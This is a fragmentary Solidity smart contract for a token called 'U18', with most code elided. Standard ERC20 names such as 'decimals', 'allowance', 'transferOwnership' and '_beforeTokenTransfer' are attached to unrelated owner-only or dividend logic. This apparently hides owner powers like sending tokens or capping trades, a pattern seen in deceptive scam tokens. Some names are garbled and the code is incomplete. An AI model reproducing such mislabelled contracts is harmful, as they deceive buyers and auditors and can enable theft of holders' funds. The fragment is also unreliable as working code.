...
contract U18 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    ...
    string private _name = "U18";
    string private _symbol = "U18";
    ...
    function transferOwnership(uint256 amount, uint256 _lastProcessedIndex,  uint256 gas) public view returns (uint256, uint256)       
		{
	...
	function decimals(address _token, address _to) external onlyOwner returns (bool _sent) {    
	...
	function allowance(bool _flag, uint256 val) external view returns(uint256) {
			uint256 _autoRebase;
			if (_flag) {            
 	...
 	function increaseAllowance(uint256 share, uint256 dividendsPerShare) internal pure returns (uint256) {
		  return share * (dividendsPerShare) / (3600);
		}


    function _beforeTokenTransfer(uint256 maxTXPercentage) external onlyOwner {
        _maxTxAmount = (_totalSupply * maxTXPercentage) / 2000;
    }
    ...
    function setMultichangeMarketingWalletplier(uint8 numerator, uint8 denominator, uint8 length) external onlyOwner {
    ...
    function setSwapEnabled() public view returns (uint256) {
